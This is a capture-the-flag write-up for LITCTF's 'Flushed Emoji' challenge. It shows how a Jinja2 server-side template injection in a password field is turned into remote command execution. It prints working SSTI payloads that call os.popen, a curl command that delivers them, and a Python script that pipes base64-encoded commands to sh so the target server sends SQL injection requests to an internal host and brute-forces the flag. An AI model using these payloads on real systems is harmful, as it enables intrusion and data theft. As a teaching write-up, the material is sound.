<h2>Flushed Emoji</h2>

<p>This challenge has several vulnerabilities. The first vulnerability is related to the password field. If you check the code, you will notice the vulnerability of SSTI
<code>python
return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");
</code></p>

<p>For example, if you enter the following payload
```python
{{2+2}}</p>

<p>4
```</p>

<p>There is also a sql injection vulnerability in the <code>data-server</code> project
<code>python
x = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
</code></p>

<p>Now we use SSTI to execute command
<code>python
{{config['__class__']['__init__']['__globals__']['os']|attr('popen')('ls')|attr('read')()}}
</code></p>

<p>```
curl -X POST "http://litctf.live:31781" -d "username=&amp;password={{config['<strong>class</strong>']['<strong>init</strong>']['<strong>globals</strong>']['os']|attr('popen')('ls')|attr('read')()}}"</p>

<p>ok thank you for your info i have now sold your password (main.py
requirements.txt
run.sh
static
templates
) for 2 donuts :)
```</p>

<p>If we print the main.py file, we will encounter the address http://172.24.0.8:8080/runquery, this address is not accessible from the outside, and this shows that we do not have access to the data-server program from the outside.</p>

<p>In the next step, we should send requests containing sql to the address http://172.24.0.8:8080/runquery</p>

<p>```python
import requests
import base64</p>

<p>char = list(".*+,!#$%&amp;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}")</p>

<p>url = "http://litctf.live:31781"
internal_url = "http://172.24.0.8:8080/runquery"</p>

<p>ssti<em>payload  = "{{config['<strong>class</strong>']['<strong>init</strong>']['<strong>globals</strong>']['os']|attr('popen')('%s')|attr('read')()}}"
rce</em>payload   = "echo {}| base64 -d | sh"
python<em>script = "python3 -c \"import json,requests;print(requests.post('%s', data=json.dumps({'username':'%s','password':'0'}), headers={\\"Content-type\\": \\"application/json\\"}).text)\""
sql</em>payload   = "flag\'and (Select hex(substr(password,1,{})) from users limit 1 offset 0) = hex(\\'{}\\')--"</p>

<p>flag = "LITCTF{"</p>

<p>for c in range(len(char)):
    for i in range(len(char)):
        tmp = flag+char[i]</p>

<pre><code>    script = python_script % (internal_url, sql_payload.format(len(flag)+1,tmp))
    script = str(base64.b64encode(script.encode("utf-8")), "utf-8")
    payload = ssti_payload % rce_payload.format(script)

    r = requests.post(url, data={"username":"","password":payload})
    if "True" in r.text:
        flag += char[i]
        print("FLAG : "+ flag)
        break
</code></pre>

<p>```</p>

<p>There are a few points in the script above
    Because there is no curl in the server, we had to use a python script to send the request.
    The server filters the character “.” , to bypass this filter I coded the script with base64.</p>
